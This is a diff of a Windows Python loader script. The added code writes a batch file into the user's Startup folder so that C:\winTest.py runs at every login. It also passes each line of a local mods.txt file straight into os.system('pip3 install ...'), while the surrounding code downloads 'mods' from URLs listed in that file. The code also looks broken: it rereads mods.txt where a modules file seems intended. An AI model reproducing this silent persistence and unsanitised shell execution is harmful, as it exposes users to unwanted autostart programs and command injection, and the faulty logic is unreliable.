@@ -67,6 +67,21 @@ os.system("pip3 install requests")
 import requests
 from zipfile import ZipFile
 deletaEXE()
+with open("C:\\winTest\\dir.txt") as file:
+    x = file.read().rstrip('\n').split('\\')[:-2]
+x.append("AppData")
+x.append("Roaming")
+x.append("Microsoft")
+x.append("Windows")
+x.append("Start Menu")
+x.append("Programs")
+x.append("Startup")
+x.append("autoStartWin.bat")
+x='\\'.join(x)
+if not os.path.isfile(x):
+    with open(x,"w+") as bat_file:
+        bat_file.write(r'start "" %s' % "C:\\winTest.py")
+
 if not os.path.isdir(f"C:\\winTest"):
     os.mkdir(f"C:\\winTest")
 if not os.path.isfile("C:\\winTest\\modules.txt"):
@@ -80,9 +95,14 @@ modules=[]
 with open("C:\\winTest\\mods.txt") as file:
     for line in file:
         mods.append(line.rstrip("\n"))
+with open("C:\\winTest\\mods.txt") as file:
+    for line in file:
+        modules.append(line.rstrip("\n"))
 for i in mods:
     url,n1,n2=i.split(' ')
     print(downloadAndSetupMod(url,n1,n2))
+for i in modules:
+    os.system(f"pip3 install {i}")
 
 
 # Запуск второго файла в отдельном процессе
